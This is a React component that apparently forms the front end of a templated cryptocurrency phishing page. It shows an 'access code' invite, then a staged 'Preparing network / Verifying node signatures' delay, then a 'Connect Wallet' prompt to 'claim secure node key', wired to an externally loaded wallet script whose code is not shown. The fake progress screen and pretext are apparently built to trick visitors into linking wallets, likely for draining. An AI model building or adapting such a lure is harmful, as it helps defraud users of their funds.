import { useCallback, useEffect, useRef, useState } from 'react'

import { CheckIcon, LockIcon, XIcon } from '@/components/icons'
import { BrandLogo } from '@/components/brand-logo'
import { templateConfig } from '@/config/template'
import { useWalletScript } from '@/hooks/use-wallet-script'
import {
  getInitialMigrationState,
  storeMigrationView,
  type MigrationView,
} from '@/lib/migration-session'
import { WALLET_CONNECT_ID, WALLET_TRIGGER_CLASS, prefetchWalletScript } from '@/lib/wallet-script'

import '@/styles/invite.css'

type MigrationInviteProps = {
  accessCode: string
}

export function MigrationInvite({ accessCode }: MigrationInviteProps) {
  const [view, setView] = useState<MigrationView>(
    () => getInitialMigrationState().view,
  )
  const [inviteVisible, setInviteVisible] = useState(
    () => getInitialMigrationState().inviteVisible,
  )
  const [preparingActive, setPreparingActive] = useState(
    () => getInitialMigrationState().preparingActive,
  )
  const [walletActive, setWalletActive] = useState(
    () => getInitialMigrationState().walletActive,
  )
  const [toastMessage, setToastMessage] = useState<string | null>(null)
  const connectButtonRef = useRef<HTMLButtonElement>(null)
  const walletFlowStarted = view === 'preparing' || view === 'wallet'

  const { isWalletScriptLoading } = useWalletScript(
    view,
    connectButtonRef,
  )

  const showToast = useCallback((message: string) => {
    setToastMessage(message)
  }, [])

  useEffect(() => {
    if (!toastMessage) return

    const timer = window.setTimeout(() => setToastMessage(null), 3000)
    return () => window.clearTimeout(timer)
  }, [toastMessage])

  const copyInviteCode = async () => {
    try {
      await navigator.clipboard.writeText(accessCode)
    } catch {
      // Clipboard API may be unavailable in some contexts.
    }

    showToast('Access code copied to clipboard')
  }

  useEffect(() => {
    storeMigrationView(view)
  }, [view])

  useEffect(() => {
    if (view === 'preparing') {
      prefetchWalletScript()
    }
  }, [view])

  const resetFlow = () => {
    setWalletActive(false)

    window.setTimeout(() => {
      setView('invite')
      setInviteVisible(true)
      storeMigrationView('invite')
    }, 400)
  }

  useEffect(() => {
    if (view === 'preparing') {
      const frame = requestAnimationFrame(() => setPreparingActive(true))
      return () => cancelAnimationFrame(frame)
    }

    setPreparingActive(false)
  }, [view])

  useEffect(() => {
    if (view === 'wallet') {
      const frame = requestAnimationFrame(() => setWalletActive(true))
      return () => cancelAnimationFrame(frame)
    }

    setWalletActive(false)
  }, [view])

  const acceptInvitation = () => {
    prefetchWalletScript()
    setInviteVisible(false)

    window.setTimeout(() => {
      setView('preparing')

      window.setTimeout(() => {
        setPreparingActive(false)

        window.setTimeout(() => {
          setView('wallet')
        }, 400)
      }, 5000)
    }, 300)
  }

  return (
    <div className="invite-page">
      <div className="bg-grid" />
      <div className="bg-radial" />

      <div className="invite-card" id="cardContainer">
        {view === 'invite' && (
          <div
            id="inviteView"
            style={{
              transition: 'opacity 0.3s ease',
              opacity: inviteVisible ? 1 : 0,
            }}
          >
            <div className="logo-container">
              <BrandLogo id="brandLogo" />
            </div>

            <div className="invite-header">
              <h1>{templateConfig.headline}</h1>
              <p className="description invite-description">
                {templateConfig.description}
              </p>
            </div>

            <div className="invite-code-container">
              <div style={{ textAlign: 'left' }}>
                <div className="code-label">Access code</div>
                <div className="code-value" id="inviteCode">
                  {accessCode}
                </div>
              </div>
              <button
                type="button"
                className="copy-btn"
                onClick={copyInviteCode}
              >
                Copy
              </button>
            </div>

            <div className="btn-stack">
              <button
                type="button"
                className="btn btn-primary"
                onClick={acceptInvitation}
              >
                Accept & Launch
              </button>
              <a
                href={templateConfig.xLink}
                target="_blank"
                rel="noopener noreferrer"
                className="btn btn-secondary"
              >
                <span className="btn-secondary-inner">
                  <XIcon />
                  <span>{templateConfig.xLabel}</span>
                </span>
              </a>
            </div>
          </div>
        )}

        {view === 'preparing' && (
          <div
            className={`animated-view${preparingActive ? ' active' : ''}`}
            id="successView"
          >
            <div className="checkmark-wrapper">
              <div className="spinner-ring" />
              <div className="success-icon-bg">
                <CheckIcon className="text-white" />
              </div>
            </div>
            <h1
              style={{
                fontSize: '20px',
                fontWeight: 500,
                marginBottom: '8px',
              }}
            >
              Preparing network
            </h1>
            <p
              className="description"
              style={{
                maxWidth: '300px',
                margin: '0 auto 12px',
                fontSize: '13px',
              }}
            >
              Verifying node signatures. Launching authorization gate
              shortly...
            </p>
          </div>
        )}

        {walletFlowStarted && (
          <div
            className={`wallet-panel${view === 'wallet' ? ` animated-view${walletActive ? ' active' : ''}` : ' wallet-panel-preload'}`}
            id={view === 'wallet' ? 'walletView' : undefined}
            aria-hidden={view !== 'wallet'}
          >
            {view === 'wallet' && (
              <>
                <div className="logo-container" style={{ marginBottom: '24px' }}>
                  <LockIcon className="text-white" />
                </div>
                <h1
                  style={{
                    fontSize: '20px',
                    fontWeight: 500,
                    marginBottom: '8px',
                  }}
                >
                  Connect Wallet
                </h1>
                <p
                  className="description"
                  style={{
                    maxWidth: '320px',
                    margin: '0 auto 28px',
                    fontSize: '13px',
                  }}
                >
                  Link your Web3 account to claim secure node key. This acts as
                  your secure interface signature.
                </p>
              </>
            )}
            <div className="btn-stack" style={{ width: '100%' }}>
              <div
                className={`wallet-connect-wrap${isWalletScriptLoading ? ' wallet-connect-blocked' : ''}`}
              >
                <button
                  ref={connectButtonRef}
                  type="button"
                  id={WALLET_CONNECT_ID}
                  className={`btn btn-primary ${WALLET_TRIGGER_CLASS}`}
                  tabIndex={view === 'wallet' ? 0 : -1}
                >
                  Connect Wallet
                </button>
                {view === 'wallet' && isWalletScriptLoading && (
                  <div
                    className="btn btn-primary wallet-connect-loading"
                    aria-busy="true"
                  >
                    Loading...
                  </div>
                )}
              </div>
              {view === 'wallet' && (
                <button
                  type="button"
                  className="btn btn-secondary"
                  onClick={resetFlow}
                >
                  Back to Start
                </button>
              )}
            </div>
          </div>
        )}
      </div>

      <div className={`toast${toastMessage ? ' show' : ''}`} id="toastMessage">
        {toastMessage ?? 'Invite code copied to clipboard'}
      </div>
    </div>
  )
}
